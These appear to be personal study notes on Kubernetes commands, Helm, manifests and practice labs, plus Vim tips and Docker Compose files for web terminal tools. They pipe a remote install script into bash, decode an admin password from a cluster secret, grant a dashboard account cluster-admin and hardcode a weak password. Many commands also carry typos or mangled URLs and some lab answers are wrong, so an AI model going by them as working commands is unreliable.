# 	- LoadBalancer
# 		$cloud-only (or MetalILB in homelabs)
#
# ---Hostname and cluster setup
# 	* hostnamectl set-hostname k8s-controller
# 	* sudo swapoff -a
# 	* cat <<EOF | sudo tee /etc/yum.repos.d/kubernetes.repo
# 	  [kubernetes]
# 	  name=Kubernetes
# 	  baseurl=https://pkgs.k8s.io/core:/stable:/v1.30/rpm/
# 	  enable=1
# 	  gpgcheck=1
# 	  repo_gpgcheck=1
# 	  gpgkey=https://pkgs.k8s.io/core:/stable:/v1.30/rpm/repodata/repomd.xml.key
# 	  EOF
# 	* sudo dnf make clean
# 	* sudo dnf makecache
# 	* sudo dnf install -y kubectl --disableexludes=kubernetes
# 	* curl -LO "https://storage.googleapis.com/minikube/releases/latest/minikube-latest.x86_64.rpm"
# 	* sudo dnf install -y ./minikube-latest.x86_64.rpm
# 	* minikube version
# 	* sudo dnf install -y docker-ce docker-ce-cli containerd.io
# 	* minikube start --driver=docker
# 	* minikube service nginx-service --url --this command will output the url for accessing the service url
#
#
#
#
# When do you use each command?
# Use kubectl get pods when you want:
# Is my app running?
# Is it crashing?
# What node is it on?
#
# Example:
#
# kubectl get pods -n test
# Use kubectl get svc when you want:
# How do I access this app?
# What IP/port do I use?
# Is it LoadBalancer or NodePort?
# kubectl get svc -n test
#
# ---
# 	* curl -LO "https://k8s.io(curl -L -s https://k8s.io)/bin/linux/amd64/kubectl"
# 	* curl $(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}') --insecure
# 	* kubectl version
# 	* kubectl version --client
# 	* kubectl version --output=json
# 	* kubectl version --output=yaml
# 		* kubectl version --output=yaml | grep kustomizeVersion <<this is just an example of what we could grep for
# 	* kubectl explain pod
# 	* kubectl create -y --this will show the subcommands for create
# 	* kubectl create -f namespace.yaml --when pointed to a yaml namespace file it will create the namespace for you
# 	* kubectl create deployment nginx-deployment --image=nginx
# 		* kubectl scale deployment nginx-deployement --relicas=3
# 			* kubectl get deployments --this will show how much the deployment has scaled up
# 	* kubectl create job busybox-job --image=busybox -- echo "Hello from k8s" --create job--creates a Job resource instead of a standalone Pod
# 		* kubectl get jobs
# 			* kubectl get pods --this should show the pod and its status
# 				* kubectl logs job/busybox-job
# 					* kubectl delete pod nginx-pod
# 					* kubectl delete deployment nginx-deployment
# 					* kubectl delete job busybox-job
# 	* kubectl cluster-info
# 	* kubectl cluster-info dump
# 	* kubectl cluster-info dump > cluster-details.txt
# 	* kubectl run -h --the run command is used to create and run specific images in a pod allowing for customization
# 	* kubectl run nginx-pod --image=nginx
# 	* kubectl get componetstatuses
# 		--scheduler: watches newly created pods with no assigned node and selects a node for them to run on
# 		--controller manager: runs controller processes which regulate the state of the system i.e. making sure the right number of pod replicas are running
# 		--etcd: distributed key-value store that acts as k8s backing store for all cluster data
# 	* kubectl get ns
# 	* kubectl get ns Namespace_name
# 	* kubectl get pvc -n zabbix
# 	* kubectl get nodes
# 	* kubectl get nodes -o wide
# 	* kubectl get nodes -n Namespace_name * kubectl describe node minikube
# 	* kubectl get storageclass
# 	* kubectl run >> creates a single pod if it dies thats it >> docker run container equivalent
# 	* kubectl run hello-minikube
# 	* kubectl run nginx --image nginx
# 	* kubectl run nginx --image nginx -n test
# 	* kubectl run test --image busybox -it --rm -- sh
# 	* kubectl run test-nginx --image=nginx --port=80
# 	* kubectl port-forward pod/test-nginx 8080:80 --address 0.0.0.0
# 	* kubectl expose pod test-nginx --type=NodePort --name=nginxnodeport-svc --port=80
# 	* kubectl get svc nginx-nodeport-svc
# 	* kubectl get all -n prod > svc,pods,nodes
# 	* kubectl get pods -A
# 	* kubectl get pods -n portainer -w --this will show pods as they are created
# 	* kubectl exec -h
# 	* kubectl exec -it POD_NAME -- /bin/bash
# 	* kubectl exec nginx-busybox -c busybox -- ls /bin --nginx-busybox is the deployment name -c is the container name
# 	* kubectl exec -it nginx-busybox -- /bin/bash
# 	* kubectl exec nginx-env -- sh -c 'echo $MY_VAR'
# 		* kubectl create deployment nginx --image=nginx --replicas=1
# 			* kubectl get pods -n defaults
# 				* kubectl exec -it nginx-433265-wff24 -- /bin/bash
# 	* kubectl port-forward service/portainer 9443:9443 --namespace portainer --address 0.0.0.0
# 	* kubectl port-forward pod/portainer-xfiefwwf 9443:9443 -n portainer --address 0.0.0.0
# 	* kubectl rollout restart deployment/<deployment_name>
# 	* kubectl rollout restart deployment/<deployment_name> -n <namespace_name>
# 	* kubectl rollout restart deployment portainer -n portainer --this will restart the pods in the deployment
# 	* kubectl get pods -o wide >> status,ip,os
# 	* kubectl get pod uptime-kuma-3wdfvs -n prod -o yaml
# 	* kubectl get pod uptime-kuma-3wdfv -n prod -o yaml > uptime-kuma3fsfv.yaml
# 	* kubectl get deployments -A
# 	* kubectl get deployment uptime-kuma -n prod
# 	* kubectl get deployment uptime-kuma -n prod -o yaml
# 	* kubectl get all -A
# 	* kubectl run nginx --image nginx -n default
# 	* kubectl run nginx-app --image nginx -n dev
# 	* kubectl run nginx-env --image=nginx --env="MY_VAR=my-value"
# 	* kubectl edit nginx-app >> image: nginx:latest
# 	* kubectl get pods -o wide -n dev
# 	* kubectl get pods -A -o wide
# 	* kubectl get pod webapp -o wide -n dev
# 	* kubectl get pod webapp -n dev -o yaml
# 	* kubectl expose pod webapp --type=NodePort --port=80 --this is exposing the vm on port 80 allowing it to be accessed outside of the pod itself
# 		--traffic then gets forwarded to the correct pods running the application
# 	* kubectl expose pod test-app --type=LoadBalancer --name=nginx-local-svc --port=80 --target-port=80 -n test
# 	* kubectl get svc -n test
# 	* kubectl expose pod test-windows-app --type=LoadBalancer --name=nginx-ext-svc --port=80 --target-port=80 -n default
# 	* kubectl port-forward pod/web-app 8080:80 -n dev
# 	* kubectl get svc webapp -n dev
# 	* kubectl describe -h --this will output all commands and actions tied to the describe command
# 	* kubectl describe pod webapp -n dev
# 	* kubectl describe svc nginx-service
# 	* kubectl create -f webapp.yml
# 	* kubectl create deployment my-app --image=nginx
# 	* kubectl create deployment my-app --image=nginx -n test
# 	* kubectl delete pod webapp -n default
# 	* kubectl get svc -n prod
# 	*****svc explained = “Show me networking entry points for apps in the cluster”
# 	* kubectl get svc uptime-kuma -n prod
# 	* kubectl get svc uptime-kuma -n prod -o yaml > uptime-kuma_sevices.yaml
# 	* kubectl get svc homepage -n prod
# 	* kubectl apply -f uptime-kuma.yaml >> this is a deployment >> if the pod dies it notices and recreates it >> think docker compose
# 	* kubectl get svc -A
# 	* kubectl get ingress -A
# 	* kubectl get replicasets >> you can create a replicaset its the same but diff. than a deployement...still creates pods but in the rs way
# 	* kubectl get rs
# 	* kubectl get rs -n dev
# 	* kubectl scale rs new-replicaset --replicas=5
# 	* kubectl scale rs new-replicaset --replicas=2
# 	* kubectl delete rs replicaset-1 -n prod
# 	* kubectl api-resources
# 	* kubectl api-resources | grep replicaset
# 	* kubectl explain replicaset | grep VERSION
# 	* kubectl create -f replicaset-definition-1.yaml
# 	* kubectl create deployment nginx-demo --image=nginx -n dev -o yaml > nginx-demo.yaml
# 	* kubectl create deployment hello-kubernetes --image=nginx:latest --port=80
# 		--'kubectl': command-line tool for interacting with k8s
# 		--'create deployment': tell k8s to create a new deployment
# 		--'hello-Kubernetes': is the name we are giving the deployment
# 		--'--image=nginx:latest': specifies the image we want to use
# 		--'--port=80': tells k8s that the container will listen on port 80
# 			* kubectl get deployments
# 			* kubectl describe pod hello-kubernetes-883432
# 			* kubectl port-forward $(kubectl get pods -o name) 8080:80
# 			* curl http://localhost:8080
# 			* kubectl delete deployement hello-kubernetes
# 	* kubeclt delete -f service.yaml -f deployement.yaml
# 		* kubectl get deployements,services,pods
# 	* kubectl get deployments -A
# 	* kubectl get deployments -n test
# 	* kubeclt get deployment nginx-demo -n test -o yaml > nginx-deployment.yaml
# 	* kubectl scale deployment nginx-demo --replicas=3
# 	* kubectl scale deployment nginx-demo -n test --replicas=0
# 	* kubectl get rs -n test
# 	* kubectl expose deployment nginx-demo --type=NodePort --port=80 -n test >> this creates a service that points to that deployment exposing it ext.
# 	* kubectl get svc -n test
# 	* kubectl get svc -A -o custom-columns='NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.spec.type,NODEPORTS:.spec.ports[*].nodePort'
# 	* kubectl get secret --namespace monitoring my-grafana -o jsonpath="{.data.admin-password}" | base64 --decode ; echo
# 	* kubectl describe secret mysecret -n mynamespace
# 	* kubectl logs -h
# 		:syntax: kubectl logs POD_NAME
# 			* kubectl get pods
# 			* kubectl logs ngixn-3223r-lfe
# 	* kubectl logs -f nginx-busybox --this will follow the logs of a pod in real-time
# 		* kubectl exec -it nginx-busybox -c nginx -- /bin/sh --run this paired with the above command to watch the logs change
# 			* curl 127.0.0.1 --this will generate traffic and watch the logs flow
# 	* kubectl logs nginx-fluentd -c nginx --deployment followed by container name
# 	* kubectl logs nginx-fluentd -c fluentd --deployment followed by container name
# 	* kubectl wait --for=condition=Ready pod -l app=nginx
#
# 	---
# 	* minikube config set driver docker
# 	* minikube start
# 	* minikube status
# 	* minikube dashboard --url
# 	* minikube stop
# 	* minikube delete
# 	* minikube pause
# 	* minikube unpause
# 	* kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.3.1/aio/deploy/recommended.yaml
# 		--kubectl get pods -n kubernetes-dashboard
# 		--kubectl get ns | grep kubernetes-dashboard
# 	* vim dashboard-admin.yaml --this needs to be created in order to log in with admin priviledges
# ---
# apiVersion: v1
# kind: ServiceAccount
# metadata:
#   name: admin-user
#   namespace: kubernetes-dashboard
#
# apiVersion: rbac.authorization.k8s.io/v1
# kind: ClusterRoleBinding
# metadata:
#   name: admin-user
# roleRef:
#   apiGroup: rbac.authorization.k8s.io
#   kind: ClusterRole
#   name: cluster-admin
# subjects:
#   - kind: ServiceAccount
#     name: admin-user
#     namespace: kubernetes-dashboard
#
# 	* kubectl apply -f dashboard-admin.yaml
# 	* kubectl get sa -n kubernetes-dashboard
# 	* kubectl get clusterrolebinding
# 	* kubectl -n kubernetes-dashboard create token admin-user
#
#
#
# ---
#  - curl -fsSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-heml-3 | bash
# 	* helm version
# 	* helm repo add portainer https://portainer.github.io/k8s/
# 	* helm repo list
# 	* helm repo update
# 	* helm install portainer portainer/portainer --namespace portainer --set service.type=NodePort
# 		$kubectl get pods -n portainer
# 		$kubectl get svc -n portainer
# 	* helm list -A
# 	* helm status portainer -n portainer
# 	* helm get values portainer -n portainer
# 	* helm upgrade portainer portainer/portainer -n portainer
# 	* helm history portainer -n portainer
# 	* helm rollback portainer 1 -n portainer
# 	* helm uninstall portainer -n portainer
# 	* helm get values portainer -n portainer > portainer-values.yaml
# 	* helm upgrade portainer portainer/portainer -f portainer-values.yaml
#
# Contstant Commands
# 	* helm list -A
# 	* helm status <release>
# 	* helm history <release>
# 	* helm upgrade <release>
# 	* helm rollback <release> <revision>
# 	* helm uninstall <relase>
# 	* helm get values <release-name> <namespace> --Name is the value you are looking for in regards to the release-name
#
# 📦 What Helm does (simple explanation)
# Instead of writing YAML like:
#     Deployment
#     Service
#     ConfigMap
#     Ingress
# You install “charts” like:
# helm install grafana grafana/grafana
#
#
# 🧠 Helm mental model
# A Helm chart is:
#     “a pre-packaged Kubernetes application”
# It contains:
#     deployments
#     services
#     configs
#     defaults
#
#
# cat <<EOF | sudo tee /etc/yum.repos.d/kubernetes.repo
# [kubernetes]
# name=Kubernetes
# baseurl=https://k8s.io
# enabled=1
# gpgcheck=1
# gpgkey=https://k8s.iorepodata/repodata-key.gpg
# exclude=kubelet kubeadm kubectl cri-tools kubernetes-cni
# EOF
#
# --dnf install -y kubelet kubeadm kubectl --disableexcludes=kubernets
#
#
# Lab 1:
#  --How many nodes are a part of the cluster and what is the version k8s runnong on the nodes
#  	* kubectl get nodes
#
#  --What is the k8s control plan url
#  	* kubectl cluster-info
#
#  --Create a Pod named nginx-pod using the nginx image
#  	* kubectl run nginx-pod --image nginx
#
# Lab 2:
#  --How many pods exist in the default namespace
#  	* kubectl get pods -A
#
#  --Create a new pod with the nginx image
#  	* kubectl run nginx --image nginx
#
#  --Which nodes are the pods placed on
#  	* kubectl get pods -o wide -n default
#
#  --What is the state of the pod webapp
#  	* kubectl get pod webapp -o wide -n default
#
# Lab 3:
#  --A pod named node-api is deployed and the container within the pod contains an env. variable named APP_COLOR
#  	--Identify the value of the APP_COLOR env. variable configured inside the container
# 	* kubectl describe pod node-api
# 		--look under Containers >> Environment section for app_color
#
# Lab 4:
#  --Create a pod named nginx in the default namespace
# 	* kubectl run nginx --image nginx
# 	* kubectl run nginx --image nginx -n default
#
#  --How many pods are running in the default namespace
# 	* kubeclt get pods -n default
# 	* kubectl get pods
#
#  --What image are the pods named newpod* running
# 	* kubectl describe pod newpods-f33EFaz
#
#  --What node are the pods place on
# 	* kubectl describe pod newpods-fee3fz
#
#  --A new pod named webapp is created...how many containers are part of the webapp pod
# 	* kubeclt get pods -n default >> Ready 1/2 >> Ready Containers in Pod/Total containers in pod >> 2 containers but only 1 is running
#
#  --What images are used for the webapp pod
# 	* kubectl describe pod webapp
#
#  --Delete the webapp pod
# 	* kubectl delete pod webapp
#
#  --Create a pod named redis and the image redis123
# 	* kubeclt run redis --image redis123 -n default
#
#  --Change the image on the pod to redis
# 	* kubectl edit redis >> change the value in the image: field >> save and exit >> k8s will auto attempt to apply the update
#
# Lab 5:
#
#  --How many replicasets exist on the system
# 	* kubectl get replicaset
# 	* kubectl get rs
#
#  --Create a replicaset in the default name space and ensure it is running
# 	* kubectl create -f replicaset-1.yaml >> in hte definition file edit the 'kind' option to create a replicaset instead of a deployement
# 	* kubectl get rs -n dev -o wide
#
#  --Edit the image the replicaset is pulling and make sure it is running
# 	* kubectl edit replicaset new-replica-set >> modify the image it is pulling >> save and exit >> delete the pods and the new images will be pulled
#
#  --Scale the replicaset to 5 pods
# 	* kubectl edit replicaset new-replicaset >> modify the replicas section to 5 >> save and exit >> the set will be auto updated
# 	* kubectl scale rs new-replicaset --replicas=5
#
#  --Scale teh replicaset to 2 pods
# 	* kubectl scale rs new-replicaset --replicas=2
#
# -------------
# Lab 6:
# --View logs from a specifig pod
# cat << EOF | kubectl apply -f -
# apiVersion: v1
# kind: Pod
# metadata:
#   name: nginx-busybox
# spec:
#   containers:
#   - name: nginx
#     image: nginx
#   - name: busybox
#     image: busybox
#     command:
#       - sleep
#       - "3600"
# EOF
# 	* kubectl wait --for=condition=Ready pod nginx-busybox
# 	* kubectl logs nginx-busybox -c busybox
# ------------
# ---2Pod Creation && exec
# cat << EOF | kubectl apply -f -
# apiVersion: v1
# kind: Pod
# metadata:
#   name: nginx-busybox
# spec:
#   containers:
#   - name: nginx
#     image: nginx
#   - name: busybox
#     image: busybox
#     command:
#       - sleep
#       - "3600"
# EOF
#
# 	* kubectl wait --for=condition=Ready pod nginx-busybox
# 	* kubectl get pods -n default --the pods name will be there but there are two containers spun up with this deployment
# 	* kubectl exec nginx-busybox -c busybox -- ls /bin --nginx-busybox is the deployment name -c is the container name
# 	* kubectl exec -it nginx-busybox -- /bin/bash

# %% [markdown]
# ### **Manifest Files**

# %% [markdown]
# ##### Nginx Deployment

# %% [markdown]
# **Deployment -> ReplicaSet -> Pods -> containers**
#
# *here-document*
#
# cat <<'EOF' > course-web-deployment.yaml
# apiVersion: apps/v1 #Uses the stable Kubernetes API version for Deployments
# kind: Deployment #Tells Kubernetes that this object is a Deployment
# metadata: #Provides information about the Deployment
#   name: course-web #The deployment name
#   labels: #It has the label
#     app: course-web #label name
# spec: #Requests that Kubernetes keep two matching Pods running
#   replicas: 2 #2 is the desired number of Pods
#   selector: #This tells the Deployment which Pods it manages
#     matchLabels: #The label for the pods it should manage
#       app: course-web #label name
#   template: #Defines a blueprint for creating each Pod
#     metadata:
#       labels: #The selector and the Pod template must use matching labels
#         app: course-web #Each Pod created from this template receives the label app: course-web, so the Deployment can find and manage it
#     spec:
#       containers: #Defines one container inside each created Pod
#         - name: nginx #Container Name
#           image: nginx:1.27-alpine #Image to use
#           imagePullPolicy: IfNotPresent #Pull image if its o not present
#           ports:
#             - name: http #Port name
#               containerPort: 80 #NGINX listens on port 80 inside the container
# EOF
#
# **Overall logic**
#
# *The manifest asks Kubernetes to:*
# 1. Create a Deployment named course-web
# 2. Create two Pods from the provided template
# 3. Run one NGINX container in each Pod
# 4. Manage Pods labeled app: course-web
# 5. Replace a managed Pod if it disappears

# %% [markdown]
# ##### First Pod

# %% [markdown]
# *here-document*
#
# cat <<'EOF' > first-pod.yaml
# apiVersion: v1 #Kubernetes' core version 1 API, which is used for Pods
# kind: Pod #Declares that this object is a Pod
# metadata:
#   name: first-nginx #gives the Pod the name
#   namespace: default #places it in the default namespace
#   labels: # attaches a searchable key-value label to the Pod
#     app: first-nginx
# spec: #Describes the desired configuration of the Pod
#   containers: #Defines a list of containers
#     - name: nginx #This Pod contains one container named nginx
#       image: nginx:1.27-alpine #Tells Kubernetes to run the NGINX image
#       imagePullPolicy: IfNotPresent #Tells Kubernetes to use the image already available on the node
#       ports: #Documents the port used by the container:
#         - name: http #The port is named http
#           containerPort: 80
#           protocol: TCP #It uses the TCP network protocol
# EOF

# %% [markdown]
# ##### Backend Deployment

# %% [markdown]
# **A Deployment manages a set of identical Pods and helps keep the desired number running**
# **The matching app label is the key connection between the Deployment and its Pods**
#
# *here-Document*
#
# cat <<'EOF' > course-nginx-deployment.yaml
# apiVersion: apps/v1 #specifies the Kubernetes API version
# kind: Deployment #says this object is a Deployment
# metadata:
#   name: course-nginx #This gives the Deployment the name course-nginx
# spec:
#   replicas: 2 #This requests two identical Pods running the application
#   selector: #This tells the Deployment which Pods it manages
#     matchLabels: #This tells the Deployment which Pods it manages
#       app: course-nginx #Label name this deployment manages or can be managed by
#   template: #This describes how new Pods should be created
#     metadata:
#       labels: #Each Pod created by this Deployment receives the label app=course-nginx
#         app: course-nginx #Label Name
#     spec:
#       containers: #Each Pod contains one container
#         - name: nginx #The container is named nginx
#           image: nginx:1.27-alpine #It uses the nginx:1.27-alpine image
#           imagePullPolicy: IfNotPresent
#           ports:
#             - name: http
#               containerPort: 80
#               protocol: TCP
# EOF
#
# kubectl apply -f course-nginx-deployment.yaml
# kubectl rollout status deployment/course-nginx --timeout=60s
# kubectl get pods -l app=course-nginx -o wide
# kubectl get deployment course-nginx
#
# **Overall logic**
#
# The configuration tells Kubernetes:
#
# 1. Create a Deployment named course-nginx
# 2. Keep two Pods running
# 3. Create Pods labeled app=course-nginx
# 4. Run an Nginx container in each Pod
# 5. Use the nginx:1.27-alpine image
# 6. Identify the container’s HTTP port as TCP port 80

# %% [markdown]
# ##### ClusterIP Service

# %% [markdown]
# ***Service selector -> matching Pod labels -> EndpointSlice addresses -> ready Pods***
#
# **Create the default Service type, ClusterIP**
# *It provides a virtual IP and DNS name reachable by workloads inside the cluster*
#
# **here-document**
#
# cat <<'EOF' > course-nginx-service.yaml
# apiVersion: v1 #selects the Kubernetes core API
# kind: Service # tells Kubernetes to create a Service
# metadata: #This names the Service course-nginx
#   name: course-nginx
# spec:
#   type: #ClusterIP #ClusterIP is the default Service type
#   selector: #The selector tells the Service which Pods should receive traffic
#     app: course-nginx #It selects every Pod with this label
#   ports: #This defines how network traffic is forwarded
#     - name: http #http gives this port mapping the name http
#       port: 80 #the port clients use when connecting to the Service
#       targetPort: http # forwards traffic to the container port named http in each selected Pod
#       protocol: TCP #specifies that the Service uses TCP networking
# EOF
#
# kubectl apply --dry-run=client -f course-nginx-service.yaml
# kubectl apply -f course-nginx-service.yaml
# kubectl get service course-nginx
#
# **Breakdown**
#
# 1. Create an internal Service named course-nginx
# 2. Assign it a stable internal ClusterIP
# 3. Find Pods labeled app=course-nginx
# 4. Accept TCP connections on Service port 80
# 5. Forward those connections to the selected Pods' named http port

# %% [markdown]
# ##### Busybox Temp Pod

# %% [markdown]
# kubectl run service-client \
#   --image=busybox:1.36 \
#   --image-pull-policy=IfNotPresent \
#   --restart=Never \
#   --rm -i \
#   -- wget -qO- http://course-nginx
#
# **Breakdown**
#
# * --image: chooses the container image and
# * --image-pull-policy=IfNotPresent: reuses the cached copy
# * --restart=Never: creates a standalone Pod rather than a controller-managed workload
# * --rm: removes the Pod after its command exits, and -i keeps command input/output attached
# * The -- separator ends kubectl options
#     - everything after it is the command inside the container
# * wget -qO-: requests the URL quietly and writes the response body to the terminal

# %% [markdown]
# ##### Nodeport Pod Creation

# %% [markdown]
# **Kubernetes can read several objects from one multi-document YAML file. Each object keeps its own apiVersion, kind, metadata, and spec; a line containing --- separates one YAML document from the next**
#
# *Node port 30080 -> Service port 80 -> Pod port http*
#
# *here-document*
#
# cat <<'EOF' > course-nginx-services.yaml
# apiVersion: v1
# kind: Service
# metadata:
#   name: course-nginx
# spec:
#   type: ClusterIP
#   selector:
#     app: course-nginx
#   ports:
#     - name: http
#       port: 80
#       targetPort: http
#       protocol: TCP
# --- #three hyphens separate two YAML documents
# apiVersion: v1
# kind: Service
# metadata:
#   name: course-nginx-nodeport
# spec:
#   type: NodePort
#   selector:
#     app: course-nginx
#   ports:
#     - name: http
#       port: 80
#       targetPort: http
#       nodePort: 30080 #30080 opens TCP port 30080 on each node
#       protocol: TCP
# EOF
#
# **Breakdown**
#
# Both Services select Pods labeled app=course-nginx, but they provide different ways to reach them:
#
# a. The ClusterIP Service is for access inside the cluster
# b. The NodePort Service additionally exposes the application through port 30080 on each node

# %% [markdown]
# ##### Two Deployments Single File Deployment

# %% [markdown]
# *here-document*
# cd /home/labex/project/scale-lab
# cat <<'EOF' > hostname-web.yaml
# apiVersion: apps/v1
# kind: Deployment
# metadata:
#   name: hostname-web
# spec:
#   replicas: 2
#   selector:
#     matchLabels:
#       app: hostname-web
#   template:
#     metadata:
#       labels:
#         app: hostname-web
#     spec:
#       containers:
#         - name: web
#           image: busybox:1.36
#           imagePullPolicy: IfNotPresent
#           command: ["sh", "-c"]
#           args:
#             - mkdir -p /www; hostname > /www/index.html; exec httpd -f -p 8080 -h /www
#           ports:
#             - name: http
#               containerPort: 8080
#
# ---
#
# apiVersion: v1
# kind: Service
# metadata:
#   name: hostname-web
# spec:
#   selector:
#     app: hostname-web
#   ports:
#     - name: http
#       port: 80
#       targetPort: http
# EOF
#
# ---
# kubectl apply -f hostname-web.yaml
# kubectl rollout status deployment/hostname-web --timeout=60s
# kubectl get pods -l app=hostname-web

# %% [markdown]
# ## Command Onelines

# %% [markdown]
# ## Helm

# %% [markdown]
# # **Terraform**

# %% [markdown]
# # **Vim Motions**

# %% [markdown]
# ---
# ### Moving between panes
# #### :wincmd h left
# #### :wincmd j down
# #### :wincmd k up
# #### :wincmd l right
#
# #### Ctrl+w h  → left
# #### Ctrl+w j  → down
# #### Ctrl+w k  → up
# #### Ctrl+w l  → right
#
# ### Creating New Windows
# #### :Hex --horizontal
# #### :Vex --verticle
#
# ### Moving To end and beginning of line
# #### shift + i begining of line
# #### shift + a end of line

# %% [markdown]
# # **Docker**

# %% [markdown]
# ### Docker Compose

# %% [markdown]
# #### **Wetty**

# %% [markdown]
# version: '3.8'
#
# services:
#   wetty:
#     image: wettyoss/wetty:latest
#     container_name: wetty
#     restart: unless-stopped
#     ports:
#       - "8888:3000"
#     environment:
#       - BASE=/wetty/
#       - SSHHOST=host.docker.internal
#       - SSHPORT=22
#     extra_hosts:
#       - "host.docker.internal:host-gateway"

# %% [markdown]
# #### **cloud commander**

# %% [markdown]
# version: '3.8'
#
# services:
#   filemanager:
#     image: coderaiser/cloudcmd:latest
#     container_name: cloud_commander
#     restart: unless-stopped
#     ports:
#       - "8888:8000"
#     environment:
#       - CLOUDCMD_AUTH=true
#       - CLOUDCMD_USERNAME=sysadmin
#       - CLOUDCMD_PASSWORD=Passw0rd
#       - CLOUDCMD_EDITOR=edward      # Built-in code editor
#       - CLOUDCMD_TERMINAL=true      # Enables the built-in web terminal
#
#     volumes:
#       # Replace '/path/to/your/storage' with the actual host folder you want to manage
#       - /home/sysadmin:/home/node
#
#
# docker exec -it cloud_commander ls -la /home/node
